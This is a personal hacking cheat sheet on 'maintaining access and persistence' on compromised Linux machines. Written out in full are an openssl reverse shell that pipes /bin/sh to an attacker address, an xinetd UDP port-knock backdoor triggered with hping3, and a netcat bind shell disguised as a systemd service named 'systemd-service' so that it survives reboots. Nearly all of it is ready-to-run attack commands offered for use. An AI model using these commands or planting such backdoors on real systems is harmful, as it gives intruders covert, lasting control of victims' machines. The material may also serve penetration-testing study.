# ------------------------------- start maintaining access and presistence overview ------------------------------- # 
    ==> Quick view: is crucial because we might need to interact with the hacked system repeatedly.
    Therefore, in order to achieve persistent access.
    There are serveral techniques:
        - openssl reverse shell.
        - ICMP reverse shell.
        - Xinetd UDP portknock backdoor.
        - Systemd netcat bind shell.

    ==> V.I Note: cheatsheet reverse shell: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
                                            https://highon.coffee/blog/reverse-shell-cheat-sheet/

    ==> V.I Note: read mkfifo named pipes: https://en.wikipedia.org/wiki/Named_pipe#In_Unix
    ==> V.I Note: read port knock: https://en.wikipedia.org/wiki/Port_knocking
# -------------------------------   end maintaining access and presistence overview ------------------------------- # 

# ------------------------------- start maintaining access and presistence techniques ------------------------------- # 
    # ---------- |openssl reverse shell| ---------- #
        1st: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
            ==> explanation: create ssl certificate.
        2nd: openssl s_server -quiet -key kem.pem -cert cert.pem -port 443
            ==> explanation: start listner on attack machine with key and certificate.
        3rd: mkfifo /tmp/x; /bin/sh -i </tmp/x 2>&1 | openssl s_client -quiet -connect <attacker_ip>:<attacker_port>
        /tmp/x; rm /tmp/x
            ==> explanation: start reverse shell from compromised machine.
    # ---------- |openssl reverse shell| ---------- #
    
    # ---------- |ICMP reverse shell| ---------- #
        # ---------- |tools| ---------- #
            - icmpsh
    # ---------- |ICMP reverse shell| ---------- #
        
    # ---------- |Xinetd UDP portknock backdoor| ---------- #
        ==> Quick View: built-in Xinetd daemon, which is used to manage
        network-based services on linux systems.
        Xinetd listens for incoming requests to ports we can define, and when a specific
        request is received, we can have it execute a command.

    # ---------- |Xinetd UDP portknock backdoor| ---------- #
        # ---------- |Tools| ---------- #
            - xinetd_server.sh: https://gist.github.com/anonymous/3cb8e474b6bb3fd3787bda1e1a55cf56

        # ---------- |xinetd_server.sh| ---------- #
            1st: change server ip and server port to point to attack machine.
            2nd: run tool with bash on compromised machine.
            3rd: nc -nvlp <port>
                ==> explanation: make attacker machine listen on port port>
            4th: hping3 -2 -c 1 <target_ip> -p <port_for_knocking>
                ==> explanation: knock on udp port. 
    # ---------- |Xinetd UDP portknock backdoor| ---------- #

    # ---------- |Systemd netcat bind shell| ---------- #
        1st: cp /bin/nc /lib/systemd/systemd-service
            ==> explanation: on the compromised machine, /bin/nc into systmd with systemd-service.
        2nd: create file on compromised machine with the following content:
            [Unit]
            Description = Sytemd Service
            After = network.target
             [Service]
            ExecStart = /lib/systemd/systemd-service -lvp port_number -e /bin/sh
             [Install]
            WantedBy = multi-user.target
        3rd: enable and start our new service on compromised machine.
            systemctl enable systemd.service
            systemctl start systemd.service
        4th: netstat -auntp | grep <port_number>
            ==> explanation: confirm on our port custom service.
        5th: nc <target_ip> <target_port>
            ==> explanation: connect from attacker machine to compromised machine through bind shell.
    # ---------- |Systemd netcat bind shell| ---------- #

# -------------------------------   end maintaining access and presistence techniques ------------------------------- # 